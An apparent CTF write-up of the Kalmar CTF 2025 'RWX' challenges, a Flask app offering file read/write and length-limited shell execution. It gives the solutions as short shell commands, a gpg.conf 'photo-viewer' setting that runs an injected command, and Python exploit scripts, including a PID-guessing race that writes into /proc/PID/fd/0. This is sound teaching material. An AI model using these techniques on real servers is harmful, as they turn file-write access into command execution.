+++
title = "Kalmar CTF 2025 - RWX series"
date = "2025-03-13"
description = "Kalmar CTF 2025 misc challenge"

[taxonomies]
tags = ["ctf", "misc", "linux", "gpg", "race condition"]
+++

## 0x00. Introduction
``` docker
FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y python3 python3-pip gcc
RUN pip3 install flask==3.1.0 --break-system-packages

WORKDIR /
COPY flag.txt /
RUN chmod 400 /flag.txt

COPY would.c /
RUN gcc -o would would.c && \
    chmod 6111 would && \
    rm would.c

WORKDIR /app
COPY app.py .

RUN useradd -m user
USER user

CMD ["python3", "app.py"]
```

Looking at the `Dockerfile`, it builds `would.c` and creates a `would` binary under the `/` directory.
A web server running on Flask is launched, and we need to obtain the flag through it.

### Concept
``` c
int main(int argc, char *argv[]) {
    char full_cmd[256] = {0}; 
    for (int i = 1; i < argc; i++) {
        strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);
        if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);
    }

    if (strstr(full_cmd, "you be so kind to provide me with a flag")) {
        FILE *flag = fopen("/flag.txt", "r");
        if (flag) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), flag)) {
                printf("%s", buffer);
            }
            fclose(flag);
            return 0;
        }
    }

    printf("Invalid usage: %s\n", full_cmd);
    return 1;
}
```

Looking at `would.c`, we can obtain the flag by executing the binary as `/would you be so kind to provide me with a flag`.

``` python
@app.route('/read')
def read():
    filename = request.args.get('filename', '')
    try:
        return send_file(filename)
    except Exception as e:
        return str(e), 400

@app.route('/write', methods=['POST'])
def write():
    filename = request.args.get('filename', '')
    content = request.get_data()
    try:
        with open(filename, 'wb') as f:
            f.write(content)
        return 'OK'
    except Exception as e:
        return str(e), 400

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6664)
```

Looking at `app.py`, arbitrary read/write is possible with `user` privileges, and command execution has a length limit.

There are RWX-Bronze, RWX-Silver, RWX-Gold, and RWX-Diamond variants where the length progressively decreases or the environment changes.


## 0x01. RWX-Bronze
The first challenge, Bronze, has a 7-byte limit.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

Using the `/write` endpoint, I saved the following content to `/home/user/x`:

``` bash
/would you be so kind to provide me with a flag
```

Then execute this command through the `/exec` endpoint:

- `sh<~x`


## 0x02. RWX-Silver
This time there's a 5-byte limit.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 5:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

Like Bronze, create `/home/user/x` and execute this command:

- `. ~/x`


## 0x03. RWX-Gold
This time it's 3 bytes, which I couldn't solve during the competition.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 3:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

I tried various approaches like `. ~`, `~/*`, `~;*` but all failed.

Later checking the writeup, I learned it required using GPG (GNU Privacy Guard), the GNU version of PGP.
It's a tool I'd never heard of, but surprisingly it comes pre-installed on Ubuntu.

To explain the background regarding PGP for the exploit scenario:

- PGP keys consist of multiple packets:
  - Public key packet
  - Secret key packet
  - User ID packet
  - Signature packet
  - Photo ID packet
  - ...
- `gpg.conf` file controls GPG's behavior:
  - `list-options`: Tag for setting options when executing `gpg --list-keys`
    - `show-photos`: Enable displaying photos attached to PGP keys when listing keys
  - `photo-viewer`: Tag specifying the program to use for displaying photos attached to PGP keys
  - `list-keys`: If this option is in `gpg.conf`, automatically displays key list when executing `gpg`
  
The explanation switches between GPG and PGP, but they're implemented to be compatible, so it's not incorrect.

Save the following content to `/home/user/.gnupg/gpg.conf`:

``` conf
list-options show-photos
photo-viewer /would you be so kind to provide me with a flag > /tmp/x 
list-keys
```

Then executing the `gpg` command displays the key list according to settings.
During this process, since the binary for displaying photos is set to `/would you be so kind to provide me with a flag > /tmp/x`, the command executes when displaying photos.

### Payload
``` python
import requests
import base64

url = "http://localhost:6664"

def rwx_read(filename):
    uri = url + "/read"
    uri += "?filename=" + filename
    return requests.get(uri)

def rwx_write(filename, data):
    uri = url + "/write"
    uri += "?filename=" + filename
    return requests.post(uri, data=data)

def rwx_exec(cmd):
    uri = url + "/exec"
    uri += "?cmd=" + cmd
    return requests.get(uri)

def main():
    rwx_exec("gpg")
    gpg_conf_content = (
        "list-options show-photos\n"
        "photo-viewer /would you be so kind to provide me with a flag > /tmp/x\n"
        "list-keys\n"
    )
    rwx_write("/home/user/.gnupg/gpg.conf", gpg_conf_content)

    with open("pubring.kbx", "rb") as f:
        pubring_data = f.read()
    rwx_write("/home/user/.gnupg/pubring.kbx", pubring_data)
    
    rwx_exec("gpg")
    r = rwx_read("/tmp/x")
    print(r.text)

if __name__ == '__main__':
    main()
```


## 0x04. RWX-Diamond
The final challenge actually increases the limit to 4 bytes.

``` python
@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 4:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400
```

However, the `Dockerfile` has a change.

``` docker
...
# RUN useradd -m user
RUN useradd user
USER user

CMD ["python3", "app.py"]
```

Since the `-m` option is missing during `useradd`, the `/home/user` directory isn't created, preventing the previous approach.

I also couldn't solve this during the competition. Checking the writeup revealed it could be solved with a race condition.

``` bash
➜  rwx-diamond curl "http://localhost:6664/exec?cmd=ps"
    PID TTY          TIME CMD
      1 ?        00:00:00 python3
      8 ?        00:00:00 sh
      9 ?        00:00:00 ps
➜  rwx-diamond curl "http://localhost:6664/exec?cmd=ps"
    PID TTY          TIME CMD
      1 ?        00:00:00 python3
     11 ?        00:00:00 sh
     12 ?        00:00:00 ps
```

When executing commands consecutively like this, the PID increases by 3, allowing prediction of the next process's PID.

The exploit scenario:

|write                                    |exec               |
|:---                                     |               ---:|
|Create write process                     |                   |
|                                         |Create exec process|
|Write "/would you ..." to `STDIN` of `sh`|                   |
|                                         |Execute `w\|sh`    |

The reason for executing `w|sh` is that the length limit is 4 bytes and we need to give `STDIN` to the `sh` process, so we use the one-byte command `w`.
While giving a non-existent command to `STDIN` might work, apparently existing commands have a higher success rate due to different time windows.

Since `w|sh` creates another process called `sh`, we need to increase the PID by 4 instead of 3.

The concept is simple, but the approach is impressive.

### Payload
``` python
import requests
import threading
from time import sleep

url = "http://localhost:6664"
cmd = "/would you be so kind to provide me with a flag"

def race_fd():
    global pid
    requests.post(f"{url}/write?filename=/proc/{pid}/fd/0", data=cmd)

def race_cmd():
    global res
    res = requests.get(f"{url}/exec?cmd=w|sh").text

def rwx_exec(cmd):
    uri = url + "/exec"
    uri += "?cmd=" + cmd
    return requests.get(uri)

while True:
    r = rwx_exec("ps")
    pid = int(r.text.split("\n")[-2].split()[0])
    pid += 4
    print(f"[*] trying {pid}")

    thread_cmd = threading.Thread(target=race_cmd)
    thread_fd = threading.Thread(target=race_fd)

    thread_fd.start()
    thread_cmd.start()
    thread_cmd.join()
    thread_fd.join()

    if "kalmar{" in res:
        print(res)
        break
    
    sleep(0.1)
```